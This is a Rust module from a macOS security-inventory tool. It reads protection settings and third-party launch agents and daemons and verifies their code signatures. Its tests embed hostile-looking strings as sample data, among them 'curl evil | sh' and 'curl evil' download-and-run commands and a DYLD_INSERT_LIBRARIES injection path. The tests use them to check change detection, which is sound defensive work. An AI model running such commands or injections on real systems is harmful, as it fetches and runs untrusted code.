//! This Mac's protections and the programs it starts on its own, for the agent to judge beside
//! the inventory.
//!
//! Two bundle files, under `mac/`:
//!
//! - `mac/settings.json`: System Integrity Protection, Gatekeeper, `FileVault` and the
//!   application firewall, each as the line its tool prints. An issue names one by its key.
//! - `mac/persistence.jsonl`: every launch agent and daemon outside `/System`, one per line,
//!   with the program it starts and that program's code signature. An issue names one by the
//!   property list's path.
//!
//! Vigil reads signatures itself because a sweep's agent runs no commands. Every tool is called
//! by its absolute path: these checks decide whether a program is trusted, and a `codesign`
//! earlier on the login shell's `PATH` could answer for it.
//!
//! An item's issue is keyed by the item's path and what it runs ([`Item::identity`]): its
//! arguments and `DYLD_` variables, and for the program and script the signing team when Apple
//! issued the certificate, the content hash otherwise ([`Signature::identity`]). A dismissed
//! item whose command line changes, or whose program is replaced by one from someone else, is
//! then a new issue, while an update from the same developer keeps the dismissal.
//!
//! Not read yet: login items (Background Task Management, readable only with Full Disk
//! Access), cron, kernel and system extensions, and the other persistence locations.
//! `/System/Library/Launch*` is left out because it is on the sealed system volume.

use std::collections::BTreeMap;
use std::fs;
use std::io;
use std::path::Path;
use std::path::PathBuf;

use serde::Deserialize;
use serde::Serialize;

use crate::cancel::Cancel;
use crate::inventory::Inventory;
use crate::inventory::InventoryError;
use crate::inventory::InventorySource;
use crate::inventory::command;
use crate::inventory::command::Output;

/// What the host checks found, ready for the Mac's bundle.
#[derive(Debug, Default)]
pub(crate) struct Host {
    /// Bundle files by path: `mac/settings.json` and `mac/persistence.jsonl`.
    pub(crate) files: Vec<(String, String)>,
    /// The keys of `mac/settings.json`, which an issue may name.
    pub(crate) settings: Vec<String>,
    /// Each launch item's path, which an issue may name, and the identity of what it runs,
    /// which keys that issue (see the module docs).
    pub(crate) items: BTreeMap<String, String>,
}

/// The settings read, by key: the tool and its arguments. Each prints one line of state.
const POSTURE: [(&str, &str, &[&str]); 4] = [
    (
        "system_integrity_protection",
        "/usr/bin/csrutil",
        &["status"],
    ),
    ("gatekeeper", "/usr/sbin/spctl", &["--status"]),
    ("filevault", "/usr/bin/fdesetup", &["status"]),
    (
        "firewall",
        "/usr/libexec/ApplicationFirewall/socketfilterfw",
        &["--getglobalstate"],
    ),
];

/// The folders launchd reads jobs from, outside the sealed system volume. The user's own
/// `~/Library/LaunchAgents` is added at run time.
const LAUNCH_FOLDERS: [(ItemKind, &str); 2] = [
    (ItemKind::LaunchDaemon, "/Library/LaunchDaemons"),
    (ItemKind::LaunchAgent, "/Library/LaunchAgents"),
];

/// Where launchd looks for a program named without a folder: its default `PATH`, per
/// launchd.plist(5) (`ProgramArguments`, searched with execvp(3)).
const LAUNCHD_PATH: [&str; 4] = ["/usr/bin", "/bin", "/usr/sbin", "/sbin"];

/// Programs that run the file named by their first argument. For these the script is checked
/// too, since the interpreter is Apple's whatever the script does. `env` is not here: its
/// script is a later argument, which the agent reads in `arguments`.
const INTERPRETERS: [&str; 13] = [
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "csh",
    "tcsh",
    "perl",
    "python",
    "python3",
    "ruby",
    "osascript",
    "node",
];

/// The largest property list read, in bytes. Arbitrary: launchd jobs are a few kB, and the
/// limit keeps a planted file from being read whole.
const PLIST_LIMIT: u64 = 1024 * 1024;

const CODESIGN: &str = "/usr/bin/codesign";
const SHASUM: &str = "/usr/bin/shasum";

/// Reads the settings and launch items, recording what failed in `inventory` as problems of
/// [`InventorySource::Posture`] and [`InventorySource::LaunchItems`].
///
/// Runs `codesign` up to four times per program an item starts, and `shasum` for an unsigned
/// one, each with the inventory's time limit. Once `cancel` is set it reads no more items, and
/// records the read as cancelled.
pub(crate) fn collect(inventory: &mut Inventory, cancel: &Cancel) -> Host {
    let settings = posture(inventory, cancel);
    let mut folders: Vec<(ItemKind, PathBuf)> = LAUNCH_FOLDERS
        .iter()
        .map(|(kind, folder)| (*kind, PathBuf::from(folder)))
        .collect();
    match std::env::home_dir() {
        Some(home) => folders.push((ItemKind::UserLaunchAgent, home.join("Library/LaunchAgents"))),
        None => inventory.fail(
            InventorySource::LaunchItems,
            InventoryError::Io {
                path: PathBuf::from("~/Library/LaunchAgents"),
                source: io::Error::new(io::ErrorKind::NotFound, "no home folder: set HOME"),
            },
        ),
    }
    let items = launch_items(inventory, &folders, cancel);
    Host::new(&settings, &items)
}

impl Host {
    fn new(settings: &BTreeMap<&str, String>, items: &[Item]) -> Self {
        let settings_json =
            serde_json::to_string_pretty(settings).expect("a map of strings serializes");
        let mut lines = String::new();
        for item in items {
            let line = serde_json::to_string(item)
                .expect("an item holds only strings, booleans, and lists and maps of them");
            lines.push_str(&line);
            lines.push('\n');
        }
        Self {
            files: vec![
                ("mac/settings.json".to_owned(), settings_json),
                ("mac/persistence.jsonl".to_owned(), lines),
            ],
            settings: settings.keys().map(|key| (*key).to_owned()).collect(),
            items: items
                .iter()
                .map(|item| (item.path.clone(), item.identity()))
                .collect(),
        }
    }
}

/// The state each [`POSTURE`] tool prints, by key. A tool that cannot run is left out and
/// recorded, so the agent never reads a guess.
fn posture(inventory: &mut Inventory, cancel: &Cancel) -> BTreeMap<&'static str, String> {
    let mut settings = BTreeMap::new();
    for (key, program, args) in POSTURE {
        match command::run_any_status(program, args, cancel) {
            // Kept whatever the exit status: the printed state is the answer, and a tool that
            // reports an error prints that instead, which the agent reads as such.
            Ok(Some(output)) => {
                let text = format!("{} {}", output.stdout.trim(), output.stderr.trim());
                settings.insert(key, text.trim().to_owned());
            }
            Ok(None) => inventory.missing(program),
            Err(e) => inventory.fail(InventorySource::Posture, e),
        }
    }
    settings
}

/// Where a launch item was found, which decides who it runs as.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
enum ItemKind {
    /// `/Library/LaunchDaemons`: runs as root unless it names a `UserName`.
    LaunchDaemon,
    /// `/Library/LaunchAgents`: runs as every user who logs in.
    LaunchAgent,
    /// `~/Library/LaunchAgents`: runs as this user.
    UserLaunchAgent,
}

/// One launch item, as the agent reads it.
#[derive(Debug, Serialize)]
struct Item {
    /// The property list's path, which an issue names. Text, with any byte that is not UTF-8
    /// replaced, so a planted file with such a name is still listed.
    path: String,
    kind: ItemKind,
    /// Why the property list could not be read, when it could not; the fields below are then
    /// empty.
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
    label: Option<String>,
    /// The program launchd starts, from `Program` or else the first of `ProgramArguments`.
    program: Option<Program>,
    /// `ProgramArguments`, the program's own name first. Kept whole, although an argument can
    /// hold a token: the command line is what the agent judges (`sh -c`, a download piped to a
    /// shell), and the sweep's agent cannot send anything off this Mac.
    arguments: Vec<String>,
    /// The script an interpreter in [`INTERPRETERS`] runs, when its first argument is a path.
    script: Option<Program>,
    run_at_load: bool,
    /// Whether `KeepAlive` is set: `true`, or conditions under which launchd restarts it.
    keep_alive: bool,
    /// The property list's own `Disabled` key. launchd's override database
    /// (`launchctl print-disabled`) is not read, so an item shown enabled may be turned off.
    disabled: bool,
    user_name: Option<String>,
    /// The names of the environment variables it sets, with the values only of the `DYLD_`
    /// ones, which make the program load other code. Other values can hold tokens, and their
    /// names are enough to judge them.
    environment: BTreeMap<String, Option<String>>,
}

/// A file an item runs, with its signature.
#[derive(Debug, Serialize)]
struct Program {
    path: PathBuf,
    signature: Signature,
}

impl Item {
    /// An item whose property list could not be read.
    fn unread(kind: ItemKind, path: String, error: String) -> Self {
        Self {
            path,
            kind,
            error: Some(error),
            label: None,
            program: None,
            arguments: Vec::new(),
            script: None,
            run_at_load: false,
            keep_alive: false,
            disabled: false,
            user_name: None,
            environment: BTreeMap::new(),
        }
    }

    /// What the item runs, as a key part: the program's and the script's identity, the
    /// arguments, and the environment (names, and `DYLD_` values). Inline code (`sh -c`,
    /// `osascript -e`) and a script named past the first argument (`env python3 x.py`) live in
    /// the arguments, so changing them changes the identity even when the program is Apple's.
    fn identity(&self) -> String {
        let part = |program: &Option<Program>| {
            program
                .as_ref()
                .map_or_else(|| "none".to_owned(), |p| p.signature.identity())
        };
        let command = serde_json::to_string(&(&self.arguments, &self.environment))
            .expect("lists and maps of strings serialize");
        format!("{} {} {command}", part(&self.program), part(&self.script))
    }
}

/// The keys of a launchd job that the agent reads; the rest are ignored.
#[derive(Debug, Default, Deserialize)]
#[serde(rename_all = "PascalCase")]
struct Job {
    label: Option<String>,
    program: Option<String>,
    program_arguments: Option<Vec<String>>,
    run_at_load: Option<bool>,
    keep_alive: Option<plist::Value>,
    disabled: Option<bool>,
    user_name: Option<String>,
    environment_variables: Option<BTreeMap<String, plist::Value>>,
}

/// Reads every item in `folders`. A folder that does not exist has none; one that cannot be
/// listed is recorded as a problem of [`InventorySource::LaunchItems`], a failure unless
/// permission was denied (see [`InventoryError::is_failure`]). A signature check that could not
/// run is a failure too, and its item is kept with the program `unreadable`, so the agent still
/// sees it.
fn launch_items(
    inventory: &mut Inventory,
    folders: &[(ItemKind, PathBuf)],
    cancel: &Cancel,
) -> Vec<Item> {
    let mut items = Vec::new();
    for (kind, folder) in folders {
        let paths = match list(folder) {
            Ok(paths) => paths,
            Err(e) if e.kind() == io::ErrorKind::NotFound => continue,
            Err(source) => {
                let path = folder.clone();
                inventory.fail(
                    InventorySource::LaunchItems,
                    InventoryError::Io { path, source },
                );
                continue;
            }
        };
        for path in paths {
            if cancel.is_cancelled() {
                let what = "reading launch items".to_owned();
                inventory.fail(
                    InventorySource::LaunchItems,
                    InventoryError::Cancelled { what },
                );
                return items;
            }
            let mut failures = Vec::new();
            items.push(read_item(*kind, &path, cancel, &mut failures));
            for e in failures {
                inventory.fail(InventorySource::LaunchItems, e);
            }
        }
    }
    items
}

/// The entries of `folder`, sorted. Hidden ones are kept, since launchd loads them too; only
/// Finder's `.DS_Store` is skipped.
fn list(folder: &Path) -> io::Result<Vec<PathBuf>> {
    let mut paths = Vec::new();
    for entry in fs::read_dir(folder)? {
        let entry = entry?;
        if entry.file_name() != ".DS_Store" {
            paths.push(entry.path());
        }
    }
    paths.sort();
    Ok(paths)
}

/// Reads one item and checks what it runs. A property list that cannot be read is an item with
/// its `error`; a check that cannot run is pushed to `failures`.
fn read_item(
    kind: ItemKind,
    path: &Path,
    cancel: &Cancel,
    failures: &mut Vec<InventoryError>,
) -> Item {
    let shown_path = path.to_string_lossy().into_owned();
    let job = match read_job(path) {
        Ok(job) => job,
        Err(error) => return Item::unread(kind, shown_path, error),
    };
    let arguments = job.program_arguments.unwrap_or_default();
    let program = job
        .program
        .as_deref()
        .or(arguments.first().map(String::as_str))
        .map(|name| checked(resolve(name), cancel, failures));
    let script = match (&program, arguments.get(1)) {
        (Some(program), Some(first)) if is_interpreter(&program.path) && first.starts_with('/') => {
            Some(checked(PathBuf::from(first), cancel, failures))
        }
        _ => None,
    };
    let environment = job
        .environment_variables
        .unwrap_or_default()
        .into_iter()
        .map(|(name, value)| {
            let shown = name
                .starts_with("DYLD_")
                .then(|| value.as_string().unwrap_or("(not text)").to_owned());
            (name, shown)
        })
        .collect();
    Item {
        path: shown_path,
        kind,
        error: None,
        label: job.label,
        program,
        arguments,
        script,
        run_at_load: job.run_at_load.unwrap_or(false),
        keep_alive: job
            .keep_alive
            .is_some_and(|value| value.as_boolean() != Some(false)),
        disabled: job.disabled.unwrap_or(false),
        user_name: job.user_name,
        environment,
    }
}

/// Parses the property list at `path`, or says why it cannot be read.
fn read_job(path: &Path) -> Result<Job, String> {
    let metadata = fs::metadata(path).map_err(|e| format!("cannot read it: {e}"))?;
    // A FIFO would block the read; a folder or device is no job launchd can load.
    if !metadata.is_file() {
        return Err("not a regular file".to_owned());
    }
    if metadata.len() > PLIST_LIMIT {
        return Err(format!(
            "{} bytes, more than the {PLIST_LIMIT} read",
            metadata.len()
        ));
    }
    let bytes = fs::read(path).map_err(|e| format!("cannot read it: {e}"))?;
    plist::from_bytes(&bytes).map_err(|e| format!("not a launchd property list: {e}"))
}

/// The file launchd runs for `name`: the path itself, or for a bare name the first match on
/// launchd's `PATH`. A bare name with no match is returned as it is and reads as missing.
fn resolve(name: &str) -> PathBuf {
    if name.contains('/') {
        return PathBuf::from(name);
    }
    LAUNCHD_PATH
        .iter()
        .map(|folder| Path::new(folder).join(name))
        .find(|candidate| candidate.is_file())
        .unwrap_or_else(|| PathBuf::from(name))
}

fn is_interpreter(path: &Path) -> bool {
    path.file_name()
        .and_then(|name| name.to_str())
        .is_some_and(|name| INTERPRETERS.contains(&name))
}

/// `path` with its signature. A check that cannot run leaves the program `unreadable` and goes
/// to `failures`.
fn checked(path: PathBuf, cancel: &Cancel, failures: &mut Vec<InventoryError>) -> Program {
    let signature = signature(&path, cancel).unwrap_or_else(|e| {
        let detail = format!("the check could not run: {e}");
        failures.push(e);
        Signature::Unreadable { detail }
    });
    Program { path, signature }
}

/// A program's code signature, as `codesign` verifies it.
#[derive(Debug, PartialEq, Eq, Serialize)]
#[serde(tag = "status", rename_all = "snake_case")]
enum Signature {
    /// No file at the path: the job fails to start, or starts whatever is put there later.
    Missing,
    /// Not a regular file, or one this user cannot read.
    Unreadable { detail: String },
    /// Not signed at all.
    Unsigned { sha256: String },
    /// Signed, but the signature does not verify: the file changed after it was signed.
    Invalid { detail: String },
    /// Signed by Apple: part of macOS or an Apple app.
    Apple,
    /// Signed with a certificate Apple issued: Developer ID, App Store or development.
    AppleIssued {
        authority: Option<String>,
        team: Option<String>,
    },
    /// Signed with a certificate Apple did not issue, which Gatekeeper does not trust. Its
    /// names are the signer's own claim.
    OtherIssuer {
        authority: Option<String>,
        team: Option<String>,
        cdhash: String,
    },
    /// Signed with no identity, as the linker signs every arm64 build.
    AdHoc { cdhash: String },
}

impl Signature {
    /// Who stands behind the file, as a key part. Only the team of an Apple-issued
    /// certificate survives an update; every other identity is the file's own hash, since the
    /// names in it are the signer's claim. An invalid signature is one identity whatever the
    /// file holds: that the file broke is the news.
    fn identity(&self) -> String {
        match self {
            Self::Missing => "missing".to_owned(),
            Self::Unreadable { .. } => "unreadable".to_owned(),
            Self::Unsigned { sha256 } => format!("sha256:{sha256}"),
            Self::Invalid { .. } => "invalid".to_owned(),
            Self::Apple => "apple".to_owned(),
            Self::AppleIssued { authority, team } => match (team, authority) {
                (Some(team), _) => format!("team:{team}"),
                (None, authority) => format!("authority:{}", authority.as_deref().unwrap_or("")),
            },
            Self::OtherIssuer { cdhash, .. } | Self::AdHoc { cdhash } => format!("cdhash:{cdhash}"),
        }
    }
}

/// Checks the signature of the file at `path`: what `codesign -d` shows, whether it
/// verifies, and whether Apple issued the certificate. The names `codesign -d` shows are the
/// signer's claim (a self-signed certificate can be called "Software Signing"); only a
/// requirement check (`-R=anchor apple`) tests who issued it.
fn signature(path: &Path, cancel: &Cancel) -> Result<Signature, InventoryError> {
    // launchd resolves a relative path against the job's `WorkingDirectory`, and a bare name on
    // its `PATH`, which `resolve` already searched; Vigil's own folder says nothing about either.
    if !path.is_absolute() {
        if path.components().count() == 1 {
            return Ok(Signature::Missing);
        }
        let detail = "a relative path, which launchd resolves against the job's \
                      WorkingDirectory; not checked"
            .to_owned();
        return Ok(Signature::Unreadable { detail });
    }
    match fs::metadata(path) {
        Err(e) if e.kind() == io::ErrorKind::NotFound => return Ok(Signature::Missing),
        Err(e) => {
            let detail = e.to_string();
            return Ok(Signature::Unreadable { detail });
        }
        // A FIFO would block `shasum`, and a folder is no program.
        Ok(metadata) if !metadata.is_file() => {
            let detail = "not a regular file".to_owned();
            return Ok(Signature::Unreadable { detail });
        }
        Ok(_) => {}
    }
    let Some(file) = path.to_str() else {
        let detail = "the path is not UTF-8".to_owned();
        return Ok(Signature::Unreadable { detail });
    };

    let shown = tool(CODESIGN, &["-d", "--verbose=4", file], cancel)?;
    if !shown.success {
        if shown.stderr.contains("code object is not signed at all") {
            let sha256 = sha256(file, cancel)?;
            return Ok(Signature::Unsigned { sha256 });
        }
        let detail = first_line(&shown.stderr);
        return Ok(Signature::Unreadable { detail });
    }
    let shown = Shown::parse(&shown.stderr);
    // Every signed file has a code directory hash. Without one the output changed shape, and
    // the identities built on it would all be the same, so a dismissal would outlive any
    // replacement.
    let Some(cdhash) = shown.cdhash else {
        let detail = "codesign -d printed no CDHash".to_owned();
        return Ok(Signature::Unreadable { detail });
    };

    let verified = tool(CODESIGN, &["--verify", "--strict", file], cancel)?;
    if !verified.success {
        let detail = first_line(&verified.stderr);
        return Ok(Signature::Invalid { detail });
    }
    if shown.adhoc {
        return Ok(Signature::AdHoc { cdhash });
    }
    if tool(CODESIGN, &["--verify", "-R=anchor apple", file], cancel)?.success {
        return Ok(Signature::Apple);
    }
    let Shown {
        authority, team, ..
    } = shown;
    if tool(
        CODESIGN,
        &["--verify", "-R=anchor apple generic", file],
        cancel,
    )?
    .success
    {
        Ok(Signature::AppleIssued { authority, team })
    } else {
        Ok(Signature::OtherIssuer {
            authority,
            team,
            cdhash,
        })
    }
}

/// What `codesign -d --verbose=4` prints on stderr, as far as a signature's identity goes.
#[derive(Debug, Default, PartialEq, Eq)]
struct Shown {
    /// The first `Authority=` line: the leaf certificate's name.
    authority: Option<String>,
    /// `TeamIdentifier=`, unless "not set".
    team: Option<String>,
    cdhash: Option<String>,
    /// Whether it printed `Signature=adhoc`.
    adhoc: bool,
}

impl Shown {
    fn parse(stderr: &str) -> Self {
        let mut shown = Self::default();
        for line in stderr.lines() {
            let Some((name, value)) = line.split_once('=') else {
                continue;
            };
            let value = value.trim().to_owned();
            match name {
                "Authority" if shown.authority.is_none() => shown.authority = Some(value),
                "TeamIdentifier" if value != "not set" => shown.team = Some(value),
                "CDHash" => shown.cdhash = Some(value),
                "Signature" => shown.adhoc = value == "adhoc",
                _ => {}
            }
        }
        shown
    }
}

/// The SHA-256 of `file`, in hex.
fn sha256(file: &str, cancel: &Cancel) -> Result<String, InventoryError> {
    let output = tool(SHASUM, &["-a", "256", "--", file], cancel)?;
    let digest = output.stdout.split_whitespace().next().unwrap_or_default();
    if output.success && digest.len() == 64 && digest.bytes().all(|b| b.is_ascii_hexdigit()) {
        Ok(digest.to_owned())
    } else {
        Err(InventoryError::Command {
            command: output.command,
            detail: output.detail,
        })
    }
}

/// Runs a system tool that must be there: one that is not is an error, not a tool to skip.
fn tool(program: &str, args: &[&str], cancel: &Cancel) -> Result<Output, InventoryError> {
    command::run_any_status(program, args, cancel)?.ok_or_else(|| InventoryError::Spawn {
        command: program.to_owned(),
        source: io::Error::new(io::ErrorKind::NotFound, "not found; it ships with macOS"),
    })
}

fn first_line(text: &str) -> String {
    text.lines().next().unwrap_or_default().trim().to_owned()
}

#[cfg(test)]
mod tests {
    use std::os::unix::fs::PermissionsExt as _;

    use super::*;

    /// `codesign -d --verbose=4` of a Developer ID helper and of an ad-hoc build, trimmed to
    /// the lines read.
    const DEVELOPER_ID: &str = "Executable=/Library/PrivilegedHelperTools/com.docker.vmnetd
Identifier=com.docker.vmnetd
CDHash=0123abcd
Authority=Developer ID Application: Docker Inc (9BNSXJN65R)
Authority=Developer ID Certification Authority
Authority=Apple Root CA
TeamIdentifier=9BNSXJN65R
";
    const AD_HOC: &str = "Identifier=hippius_mem-1057e8020cc77b7d
CDHash=967e47372e37cc02d67c5f3dfe1efdb62c719c67
Signature=adhoc
TeamIdentifier=not set
";

    #[test]
    fn display_gives_the_leaf_authority_team_and_hash() {
        assert_eq!(
            Shown::parse(DEVELOPER_ID),
            Shown {
                authority: Some("Developer ID Application: Docker Inc (9BNSXJN65R)".to_owned()),
                team: Some("9BNSXJN65R".to_owned()),
                cdhash: Some("0123abcd".to_owned()),
                adhoc: false,
            }
        );
        assert_eq!(
            Shown::parse(AD_HOC),
            Shown {
                authority: None,
                team: None,
                cdhash: Some("967e47372e37cc02d67c5f3dfe1efdb62c719c67".to_owned()),
                adhoc: true,
            }
        );
    }

    #[test]
    fn signatures_of_real_files() {
        let tmp = tempfile::tempdir().unwrap();
        let cancel = Cancel::new();

        assert_eq!(
            signature(Path::new("/bin/ls"), &cancel).unwrap(),
            Signature::Apple
        );
        assert_eq!(
            signature(&tmp.path().join("gone"), &cancel).unwrap(),
            Signature::Missing
        );
        assert!(matches!(
            signature(tmp.path(), &cancel).unwrap(),
            Signature::Unreadable { .. }
        ));

        let script = tmp.path().join("run.sh");
        fs::write(&script, "hello\n").unwrap();
        assert_eq!(
            signature(&script, &cancel).unwrap(),
            Signature::Unsigned {
                sha256: "5891b5b522d5df086d0ff0b110fbd9d21bb4fc7163af34d08286a2e846f6be03"
                    .to_owned()
            }
        );

        // A copy of an Apple binary keeps its signature, until a byte of its code changes.
        let copy = tmp.path().join("ls");
        let mut bytes = fs::read("/bin/ls").unwrap();
        fs::write(&copy, &bytes).unwrap();
        assert_eq!(signature(&copy, &cancel).unwrap(), Signature::Apple);
        let last = bytes.len() / 2;
        bytes[last] ^= 0xff;
        fs::write(&copy, &bytes).unwrap();
        assert!(
            matches!(
                signature(&copy, &cancel).unwrap(),
                Signature::Invalid { .. }
            ),
            "{:?}",
            signature(&copy, &cancel)
        );
    }

    #[test]
    fn identities_follow_the_team_or_the_content() {
        let issued = |team: &str| Signature::AppleIssued {
            authority: Some("Developer ID Application: X".to_owned()),
            team: Some(team.to_owned()),
        };
        assert_eq!(issued("T1").identity(), issued("T1").identity());
        assert_ne!(issued("T1").identity(), issued("T2").identity());
        let unsigned = |sha256: &str| Signature::Unsigned {
            sha256: sha256.to_owned(),
        };
        assert_ne!(unsigned("a").identity(), unsigned("b").identity());
        // A self-signed certificate that claims a team is keyed by its content, not the claim.
        let other = |cdhash: &str| Signature::OtherIssuer {
            authority: None,
            team: Some("T1".to_owned()),
            cdhash: cdhash.to_owned(),
        };
        assert_ne!(other("a").identity(), other("b").identity());
        assert_ne!(other("a").identity(), issued("T1").identity());
        assert_ne!(Signature::Missing.identity(), Signature::Apple.identity());
    }

    /// Reads one item, whose checks must all run.
    fn read(kind: ItemKind, path: &Path) -> Item {
        let mut failures = Vec::new();
        let item = read_item(kind, path, &Cancel::new(), &mut failures);
        assert!(failures.is_empty(), "{failures:?}");
        item
    }

    fn plist(dir: &Path, name: &str, body: &str) -> PathBuf {
        let path = dir.join(name);
        let text = format!(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\"><dict>{body}\
             </dict></plist>\n"
        );
        fs::write(&path, text).unwrap();
        path
    }

    #[test]
    fn an_item_names_its_program_script_and_dyld_values_only() {
        let tmp = tempfile::tempdir().unwrap();
        let script = tmp.path().join("run.sh");
        fs::write(&script, "hello\n").unwrap();
        let body = format!(
            "<key>Label</key><string>com.example.runner</string>\
             <key>ProgramArguments</key><array><string>sh</string>\
             <string>{}</string></array>\
             <key>KeepAlive</key><dict><key>SuccessfulExit</key><false/></dict>\
             <key>EnvironmentVariables</key><dict>\
             <key>API_TOKEN</key><string>secret</string>\
             <key>DYLD_INSERT_LIBRARIES</key><string>/tmp/x.dylib</string></dict>",
            script.display()
        );
        let path = plist(tmp.path(), "com.example.runner.plist", &body);
        let item = read(ItemKind::LaunchDaemon, &path);

        assert_eq!(item.label.as_deref(), Some("com.example.runner"));
        let program = item.program.as_ref().unwrap();
        assert_eq!(program.path, Path::new("/bin/sh"));
        assert_eq!(program.signature, Signature::Apple);
        let ran = item.script.as_ref().unwrap();
        assert_eq!(ran.path, script);
        assert!(matches!(ran.signature, Signature::Unsigned { .. }));
        assert!(item.keep_alive && !item.run_at_load && !item.disabled);
        assert_eq!(item.environment["API_TOKEN"], None);
        assert_eq!(
            item.environment["DYLD_INSERT_LIBRARIES"].as_deref(),
            Some("/tmp/x.dylib")
        );
        let line = serde_json::to_string(&item).unwrap();
        assert!(!line.contains("secret"), "{line}");
        assert!(line.contains(r#""kind":"launch_daemon""#), "{line}");

        // Changing the script changes the identity, so a dismissed item shows again.
        let before = item.identity();
        fs::write(&script, "curl evil | sh\n").unwrap();
        let path = tmp.path().join("com.example.runner.plist");
        let after = read(ItemKind::LaunchDaemon, &path);
        assert_ne!(before, after.identity());

        // So does changing the command line of an Apple program, which no signature covers.
        let inline = |code: &str| {
            let body = format!(
                "<key>ProgramArguments</key><array><string>/bin/sh</string>\
                 <string>-c</string><string>{code}</string></array>"
            );
            read(
                ItemKind::LaunchDaemon,
                &plist(tmp.path(), "inline.plist", &body),
            )
            .identity()
        };
        assert_eq!(inline("echo hi"), inline("echo hi"));
        assert_ne!(inline("echo hi"), inline("curl evil"));
        let dyld = |library: &str| {
            let body = format!(
                "<key>Program</key><string>/bin/ls</string>\
                 <key>EnvironmentVariables</key><dict>\
                 <key>DYLD_INSERT_LIBRARIES</key><string>{library}</string></dict>"
            );
            read(
                ItemKind::LaunchAgent,
                &plist(tmp.path(), "dyld.plist", &body),
            )
            .identity()
        };
        assert_ne!(dyld("/tmp/a.dylib"), dyld("/tmp/b.dylib"));
    }

    #[test]
    fn a_bad_property_list_is_an_item_with_its_error() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("broken.plist");
        fs::write(&path, "not a plist").unwrap();
        let item = read(ItemKind::UserLaunchAgent, &path);
        assert!(
            item.error
                .unwrap()
                .starts_with("not a launchd property list")
        );
        assert!(item.program.is_none());

        let empty = plist(tmp.path(), "empty.plist", "");
        let item = read(ItemKind::LaunchAgent, &empty);
        assert!(item.error.is_none() && item.program.is_none());
        assert_eq!(item.identity(), "none none [[],{}]");
    }

    #[test]
    fn a_stale_item_points_at_a_missing_program() {
        let tmp = tempfile::tempdir().unwrap();
        let body = "<key>ProgramArguments</key><array>\
                    <string>/nonexistent/old-app</string></array>";
        let path = plist(tmp.path(), "old.plist", body);
        let item = read(ItemKind::UserLaunchAgent, &path);
        assert_eq!(item.program.unwrap().signature, Signature::Missing);

        // A relative path is resolved by launchd against the job's folder, never Vigil's.
        let body = "<key>Program</key><string>bin/tool</string>";
        let path = plist(tmp.path(), "relative.plist", body);
        let item = read(ItemKind::UserLaunchAgent, &path);
        assert!(matches!(
            item.program.unwrap().signature,
            Signature::Unreadable { detail } if detail.starts_with("a relative path")
        ));
    }

    #[test]
    fn bare_names_resolve_on_launchds_path() {
        assert_eq!(resolve("ls"), Path::new("/bin/ls"));
        assert_eq!(resolve("/opt/x"), Path::new("/opt/x"));
        assert_eq!(resolve("no-such-tool"), Path::new("no-such-tool"));
        assert!(is_interpreter(Path::new("/bin/zsh")));
        assert!(!is_interpreter(Path::new("/bin/ls")));
    }

    #[test]
    fn folders_that_are_missing_are_empty_and_unlistable_ones_are_noted() {
        let tmp = tempfile::tempdir().unwrap();
        let locked = tmp.path().join("locked");
        fs::create_dir(&locked).unwrap();
        plist(&locked, "a.plist", "");
        fs::set_permissions(&locked, fs::Permissions::from_mode(0o000)).unwrap();
        let open = tmp.path().join("open");
        fs::create_dir(&open).unwrap();
        plist(&open, "b.plist", "");
        fs::write(open.join(".DS_Store"), "").unwrap();

        let mut inventory = Inventory::default();
        let folders = [
            (ItemKind::LaunchAgent, tmp.path().join("missing")),
            (ItemKind::LaunchAgent, locked.clone()),
            (ItemKind::UserLaunchAgent, open.clone()),
        ];
        let items = launch_items(&mut inventory, &folders, &Cancel::new());
        fs::set_permissions(&locked, fs::Permissions::from_mode(0o755)).unwrap();

        let paths: Vec<&str> = items.iter().map(|i| i.path.as_str()).collect();
        assert_eq!(paths, [open.join("b.plist").to_str().unwrap()]);
        // A folder this user may not read is a note, as everywhere in the inventory: it stays
        // so on every sweep, and counting it would keep this Mac from ever being clear.
        assert_eq!(inventory.problems.len(), 1, "{:?}", inventory.problems);
        assert!(inventory.failed.is_empty());

        // A cancelled read stops before the next item and counts as not checked.
        let cancel = Cancel::new();
        cancel.cancel();
        let mut inventory = Inventory::default();
        let folders = [(ItemKind::UserLaunchAgent, open.clone())];
        assert!(launch_items(&mut inventory, &folders, &cancel).is_empty());
        assert!(inventory.failed.contains(&InventorySource::LaunchItems));
    }

    #[test]
    fn host_files_and_keys_come_from_what_was_read() {
        let tmp = tempfile::tempdir().unwrap();
        let path = plist(tmp.path(), "a.plist", "");
        let item = read(ItemKind::LaunchAgent, &path);
        let settings = BTreeMap::from([("filevault", "FileVault is On.".to_owned())]);
        let host = Host::new(&settings, &[item]);

        assert_eq!(host.settings, ["filevault"]);
        let key = path.to_str().unwrap();
        assert_eq!(host.items[key], "none none [[],{}]");
        let names: Vec<&str> = host.files.iter().map(|(n, _)| n.as_str()).collect();
        assert_eq!(names, ["mac/settings.json", "mac/persistence.jsonl"]);
        assert!(host.files[0].1.contains("FileVault is On."));
        assert_eq!(host.files[1].1.lines().count(), 1);
    }
}
